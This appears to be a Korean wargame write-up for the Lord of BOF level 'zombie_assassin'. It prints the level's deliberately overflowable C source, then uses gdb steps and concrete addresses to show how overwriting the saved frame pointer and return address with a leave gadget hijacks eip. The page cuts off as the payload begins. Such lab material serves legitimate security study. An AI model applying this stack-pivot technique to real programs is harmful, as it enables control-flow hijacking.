{"componentChunkName":"component---node-modules-gatsby-theme-portfolio-minimal-src-templates-article-index-tsx","path":"/Lord-of-BOF-WriteUp-16/","result":{"pageContext":{"article":{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/f966d2796c118cfb3696d47c24ce8320/a2661/0.png","srcSet":"/static/f966d2796c118cfb3696d47c24ce8320/27b82/0.png 103w,\n/static/f966d2796c118cfb3696d47c24ce8320/26f85/0.png 206w,\n/static/f966d2796c118cfb3696d47c24ce8320/a2661/0.png 411w","sizes":"(min-width: 411px) 411px, 100vw"},"sources":[{"srcSet":"/static/f966d2796c118cfb3696d47c24ce8320/643ae/0.webp 103w,\n/static/f966d2796c118cfb3696d47c24ce8320/1f347/0.webp 206w,\n/static/f966d2796c118cfb3696d47c24ce8320/f4a5e/0.webp 411w","type":"image/webp","sizes":"(min-width: 411px) 411px, 100vw"}]},"width":660,"height":399.8540145985401}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - zombie_assassin\r\n        - FEBP\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack retbayed you!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\x40'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"library retbayed you, too!!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// strncpy instead of strcpy!</span>\r\n        <span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| buffer[40] |\r\n| SFP |\r\n| RET |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>문제에서 FEBP, fake EBP라는 힌트를 주었다. fake EBP는 golem -> darkknight 문제에서 한번 언급된 바 있다.\r\nfake EBP는 ebp를 통해 eip를 조작하는 기법이다. 이를 알아보기 위해 실험을 해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 411px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/f966d2796c118cfb3696d47c24ce8320/2a432/0.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.636363636363637%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAtUlEQVR42nXOyW7DMAxFUbmm5CCxPISiRpKy8/8fWaRuNy161484NCzSj3Ndl5iydk05R6JpmgCsqN5uk3XufL1Ymogi4vO5IyIGBAumcpPe930LkUQ4plhKcc5Z61j18biPAIFoWTyGMM93Y8wwDOaqtqa9b9saYhRhIqL4JVubc/Z+MeZn+jdmPs7DzzOlpMqpZHq//ZZrLTB+XNR3v45zKY3b4j1GalzDJTs3ArRWnQXzf58nuA9rV49MAwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f966d2796c118cfb3696d47c24ce8320/c9b55/0.webp 165w,\n/static/f966d2796c118cfb3696d47c24ce8320/f2908/0.webp 330w,\n/static/f966d2796c118cfb3696d47c24ce8320/1a14a/0.webp 411w\"\n              sizes=\"(max-width: 411px) 100vw, 411px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f966d2796c118cfb3696d47c24ce8320/04c57/0.png 165w,\n/static/f966d2796c118cfb3696d47c24ce8320/d9ecf/0.png 330w,\n/static/f966d2796c118cfb3696d47c24ce8320/2a432/0.png 411w\"\n            sizes=\"(max-width: 411px) 100vw, 411px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f966d2796c118cfb3696d47c24ce8320/2a432/0.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>disas main 명령어를 통해 leave를 하는 위치를 찾았다. leave ret을 하나씩 실행하고 경과를 지켜보기 위해 이 자리에 breakpoint를 걸고 차근차근 실행해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/e2663ba3e9ac329b1a6f41b820c86578/32056/1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.84848484848485%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA+0lEQVR42oWQQXLDIAxFAbkJJgYcBIJaDsa5/yE7xtNON3XfRn/zRl8SdatEKeecUno+n8772+0m1cEwDFIeUapjAoCUUvym1hoj5kyUCTG8Xi8iihGttbyyc66UT+dsohQwjGZ8PIwxRnfE1rZExOuaS154WXhBxBBCQMSIlMk6q6QCpc4W0OnNlMCIMUZrrfMeEZ1zPTut9UcHAMRfMLOdJmNMwKM8ABhjZEf8C1E+wziOzMs8z957KeVkJz/P9/v9Si6l/Mitta21U8gl73tDDJebM33Len/vW9uONwoRU6q1YoxXMiKeQWtda+V1hQH6OcTM0/S4kL8AQw0TqfgoYacAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/e2663ba3e9ac329b1a6f41b820c86578/c9b55/1.webp 165w,\n/static/e2663ba3e9ac329b1a6f41b820c86578/f2908/1.webp 330w,\n/static/e2663ba3e9ac329b1a6f41b820c86578/ff4b8/1.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/e2663ba3e9ac329b1a6f41b820c86578/04c57/1.png 165w,\n/static/e2663ba3e9ac329b1a6f41b820c86578/d9ecf/1.png 330w,\n/static/e2663ba3e9ac329b1a6f41b820c86578/32056/1.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/e2663ba3e9ac329b1a6f41b820c86578/32056/1.png\"\n            alt=\"info_register\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>A 40개는 buffer 40바이트, BBBB는 stack frame pointer, CCCC는 return 자리이다. 뒤의 D 200개는 padding과 쉘을 위치시킬 것을 고려해 입력해 보았다. 여기까지는 leave를 하기 전이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/d2bb5cd5dea368048219384203686d1b/32056/2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.939393939393941%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAfklEQVR42iWMUQ7DIAzFXpAIJVOBQaFA6O5/zKniz5Jlo49eaz3DmfNXRA5/GGOISOTj/eGcA8DsvPcistVmZsbze8pVAIQY+hi1NmY2hu7+TnPOAM4Qe+9jTmstGWp3m6oppR1fAGKKU2e735iIVHXMsb8xJV1L19pqj0opfxXDCbp5iOtjAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d2bb5cd5dea368048219384203686d1b/c9b55/2.webp 165w,\n/static/d2bb5cd5dea368048219384203686d1b/f2908/2.webp 330w,\n/static/d2bb5cd5dea368048219384203686d1b/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d2bb5cd5dea368048219384203686d1b/04c57/2.png 165w,\n/static/d2bb5cd5dea368048219384203686d1b/d9ecf/2.png 330w,\n/static/d2bb5cd5dea368048219384203686d1b/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d2bb5cd5dea368048219384203686d1b/32056/2.png\"\n            alt=\"memory\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/70924ddd89aab8857f0c94de6ba68e80/32056/3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.84848484848485%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABNklEQVR42k2RW3LjMAwE8WGK2opFyRafeBCQnfufMUUpce03q9EzQ7DDXu9XzgkAcilEWEoBgG3bWKTWcrvd/PyPmInwfv8CAGJBbI/HA+w43t/vUjIAlFq7jgcAWLdNTVl4cs7Pc9dupmFZAIBFepcYI4h2O+wyp5ylCxECQFhXFiGiaXKT98wDWJY7ACCRCO9xBxa2w2LcB5ySCF/mJQQWRkLnBkxMH7ghDnjfoWt/fb9KHrFjSkhY6+gcwkqEtVXnnPceCT+dW2uI7fl8jALSzzMnzEytXeaVmBD/zGfU5f5rZqbnc5hVer9i51x6/x0srGPtK7b3XoQ/sYlY+PTZYXYcf19VTZWZrrW7nmtPzvu5q9qhSzjX5nEopnjBn7XTf+ZVT9i5m/ezmqpZOGFiVu0pxR/f8ij3CqXgJQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/70924ddd89aab8857f0c94de6ba68e80/c9b55/3.webp 165w,\n/static/70924ddd89aab8857f0c94de6ba68e80/f2908/3.webp 330w,\n/static/70924ddd89aab8857f0c94de6ba68e80/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/70924ddd89aab8857f0c94de6ba68e80/04c57/3.png 165w,\n/static/70924ddd89aab8857f0c94de6ba68e80/d9ecf/3.png 330w,\n/static/70924ddd89aab8857f0c94de6ba68e80/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/70924ddd89aab8857f0c94de6ba68e80/32056/3.png\"\n            alt=\"memory2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>buffer와 argv 자리에 위치하고 있는 입력값들의 위치를 찾아 두었다. 그리고 si 명령어로 leave를 해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 354px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/0da0109bacaaac6035ec6abbe85bfa20/8f50f/4.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 54.545454545454554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABN0lEQVR42n2R4XKDIBCEiaYIeJYoInB3gHn/l2zVJM2kafcPM8t8x+4hkImYLhc7DIMQonnodBKH7ucbcWbOnFJCJGs/3TyXWqZphAGaphH/C4lCDKrrlhCMMZNzMUZmttYKIdq2lVK+wY44pRZj9LMvpVzX1TknhDifzyHG9/weOx/w6V5SSllqiSnCAPZiJzf1AMcgAOj7XmsNsJda17X/9XKtdQkLbbtkpbrD7wEQkZkRMWdu2+av2DWXTJm55AcspfSLTynucDbGiPVaoX+FS61EFFMiJqXU4SutZ++XsPCeqOuUyPln9g3uts5IiET77Q02xsQUty9lRqK2bbeFvSxzi31dS8m51lxK9xR7CYv3HhFLLQAgEqLW6hn+kB+cOcQQU/LeP3xtTErJuRkRx3H8tr4AeqMdCemAXfgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0da0109bacaaac6035ec6abbe85bfa20/c9b55/4.webp 165w,\n/static/0da0109bacaaac6035ec6abbe85bfa20/f2908/4.webp 330w,\n/static/0da0109bacaaac6035ec6abbe85bfa20/7d039/4.webp 354w\"\n              sizes=\"(max-width: 354px) 100vw, 354px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0da0109bacaaac6035ec6abbe85bfa20/04c57/4.png 165w,\n/static/0da0109bacaaac6035ec6abbe85bfa20/d9ecf/4.png 330w,\n/static/0da0109bacaaac6035ec6abbe85bfa20/8f50f/4.png 354w\"\n            sizes=\"(max-width: 354px) 100vw, 354px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0da0109bacaaac6035ec6abbe85bfa20/8f50f/4.png\"\n            alt=\"info_register2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>ebp에 BBBB인 42424242가 위치해 있는 것을 볼 수 있다. 여기에서 leave 이후의 ret까지 실행시켜 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 367px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/6bba91738fc25a125141f1a311eadea8/46684/5.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABK0lEQVR42o2S4a6DIAyFUeeGCCiKUGgL2/u/5I26LMuW3Hv7C0760dMTBBeerHHONUI0TdMeJf5ZpZYIkbksyzq7eZomrfU4jv+CufAgb37bjDWzmwEg5+zXVRxG+r7/DV6cE0fjeW3blpljDOcZEshB/gE3bzAxZczGGmutWxdtjBDicrmc6yiltNHNmcu6Lt8wJMiYuRSl1KkrpXLOXDjlTExd1x3w8j2ZSy3IhESv5Pq+95uHGPcnmJUadtX75WNnYiLCmIAKj/oJ36Tcti3EiDkj4fV63VVrzXsEbdsiIhHiPpjG8WlbShkhppSIGRG77tjZWPsBl8r1XonL/fHQWr9shxhCCCmlWqsxhz5NnzAAhBC89xFgGIZTv972vxBCWL3fwtYdaf8AmjsZiJTbdygAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6bba91738fc25a125141f1a311eadea8/c9b55/5.webp 165w,\n/static/6bba91738fc25a125141f1a311eadea8/f2908/5.webp 330w,\n/static/6bba91738fc25a125141f1a311eadea8/ddb01/5.webp 367w\"\n              sizes=\"(max-width: 367px) 100vw, 367px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6bba91738fc25a125141f1a311eadea8/04c57/5.png 165w,\n/static/6bba91738fc25a125141f1a311eadea8/d9ecf/5.png 330w,\n/static/6bba91738fc25a125141f1a311eadea8/46684/5.png 367w\"\n            sizes=\"(max-width: 367px) 100vw, 367px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6bba91738fc25a125141f1a311eadea8/46684/5.png\"\n            alt=\"info_register3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>eip가 BBBB 뒤의 값인 CCCC(43434343)으로 바뀐 것을 볼 수 있다. 원래 0x43434343 자리에는 다음에 실행할 명령어의 위치가 들어 있어야 할 것이다. 이제 CCCC(ret 위치) 대신 leave의 주소인 0x080484df를 입력하고, BBBB 자리에 적당한 주소로 bffffba0를 입력해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 355px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/526ee/6.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 58.78787878787879%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABWklEQVR42pWR246jMAxAU3IFktIFcrPjBPr/HzlLmanUTl/GD5Fi68jHNssA3q/W2nEc2V9DKSUEl1JywbuuY4xxfnyllI+SEJwfjxBd110ulxcYC7atAeSCOE3OWhtiwIIhppiStc4554Nf16UfeqXVC1yI/LpoY3zwxphlXUMIhYq7utNCKfVB+DSoterXsjZm27d5mRljUsqUs9bm88xEpB8yz3mMMa3VkKJz7vbvNs/zuUsppXN2tHYYBufcsaBtb2+dT9gHjwWxoNb6zI92BIBCBAhUiXPOWvugve+NiJAKIBrzDSutfPA5JwAgomEc2H5vWr/D9/tWKpVWqRb9A0spQwwh+BgjVZqmGyulSCnetbeWMeeH3hPuhz6lFGPEcsRxBSjIBf/dmSrVbaNanzMrpR6dAwDUVq2zDDErJd9gqhRjzIAxxWe+7/sMsKxrBrhO1/+3/gKRCh7OeluatgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/c9b55/6.webp 165w,\n/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/f2908/6.webp 330w,\n/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/918eb/6.webp 355w\"\n              sizes=\"(max-width: 355px) 100vw, 355px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/04c57/6.png 165w,\n/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/d9ecf/6.png 330w,\n/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/526ee/6.png 355w\"\n            sizes=\"(max-width: 355px) 100vw, 355px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3d6ee7db3aae1d03c4f0ab49cc812e9b/526ee/6.png\"\n            alt=\"info_register4\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>이전과 동일한 실행지점까지 실행시켜 보았다. eip가 080484df, ebp가 bffffba0으로 바뀌었다. 여기에서 한 줄 더 실행시켜 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 368px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/2e00e025886577e904cbabf8a1071574/2b727/7.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABIElEQVR42o2QbXeDIAyFEbWiICqIhJfE/v9f2Sltt9Ot23L4APfkITeX4Y7TpOd5YYxxzqtHsf8UEUGAnPM0T8aYlPO6WqVUXdd/wxlz13WrW0c9zvMMAClFYw1jrKqqtm1/g41ZSl95cs6RcPPbea8hgBDiLbx8gzOmEOOoRz3pxRilFGOsaVo1KqnkIAel1L3fPhx+Tkb0ADEnROr7vuhSypgiIsYUU05vYSLEnRJmIhqkLPrlcnFuPRNJSHjfZXX2FT6/9+CJSD5gIQTECAFCDB6gaZpD1ZP+GgGvecZ8HsRj8lD0fugPMgQkjDFyzn+COd+vRFc6TO/7c+eu67z3m3PF9l3XenyBvferc25z1tqnLoTYtm1ZFu99yf+jbixTGYE3OKaZAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2e00e025886577e904cbabf8a1071574/c9b55/7.webp 165w,\n/static/2e00e025886577e904cbabf8a1071574/f2908/7.webp 330w,\n/static/2e00e025886577e904cbabf8a1071574/146b9/7.webp 368w\"\n              sizes=\"(max-width: 368px) 100vw, 368px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2e00e025886577e904cbabf8a1071574/04c57/7.png 165w,\n/static/2e00e025886577e904cbabf8a1071574/d9ecf/7.png 330w,\n/static/2e00e025886577e904cbabf8a1071574/2b727/7.png 368w\"\n            sizes=\"(max-width: 368px) 100vw, 368px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2e00e025886577e904cbabf8a1071574/2b727/7.png\"\n            alt=\"info_register5\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>eip가 ret인 080484e0로 바뀌고 ebp는 이전에 bffffba0에 들어있는 값인 44444444로 바뀌었다. 여기에서 한줄 더 실행시켜 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 352px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/7003c347f123f0e98313084b9f1042cd/ba1c3/8.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 55.15151515151515%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABOklEQVR42oWQ25KrIBBFCahBlCiJXBrobv3/n5zyqHk4Y9XsFwqKxV60yCXXWqd5mp0TQkgplVJSysfjIY5c601qLYgYY2Rm59zn85mm2b7sMA7iz0DOAKnrOh+8McY5F2JArG6ehRBKqefzeYMdOsw8juO+vfSatmEm75cDTin1fX/fjEgXfNJt2xJTgmRfr3me3+/3caFpmtGOwzgaY6y1UkqxbestHGLItZRa+14f52YYcs4Vay4ZCZVSgpl+a68rI2HBSkRmMNej3eJ9ShEAkHCnto2tvWnOpSQAYjLmhLXWCQAg5QwJYB8kIn7Fvs17bS2ntjmn1fd9gpRSQsRSyq6NxFr/B7fbtiIhMvG6fkfdtq0PPsbwT5ustQIAvr864abJOYcYfPCQQV9eT6192BNjXPyiGvUDeJkdQkCAMSwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7003c347f123f0e98313084b9f1042cd/c9b55/8.webp 165w,\n/static/7003c347f123f0e98313084b9f1042cd/f2908/8.webp 330w,\n/static/7003c347f123f0e98313084b9f1042cd/edd59/8.webp 352w\"\n              sizes=\"(max-width: 352px) 100vw, 352px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7003c347f123f0e98313084b9f1042cd/04c57/8.png 165w,\n/static/7003c347f123f0e98313084b9f1042cd/d9ecf/8.png 330w,\n/static/7003c347f123f0e98313084b9f1042cd/ba1c3/8.png 352w\"\n            sizes=\"(max-width: 352px) 100vw, 352px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7003c347f123f0e98313084b9f1042cd/ba1c3/8.png\"\n            alt=\"info_register6\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>eip마저 44444444로 바뀌었다. 이는 ebp+4에 위치하고 있는 값이었을 것이다. 일련의 과정들을 통해 fake EBP를 다음과 같이 정리해 볼 수 있다.\r\n본래의 SFP 자리에 어떤 주소지를 입력하고 ret 자리에 leave의 주소를 입력하면, SFP 자리에 입력된 주소지가 ebp가 되고, 거기서 4만큼 증가된 자리에 들어있는 주소지가 eip가 된다.\r\n이를 바탕으로 페이로드를 다음과 같이 작성하였다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code 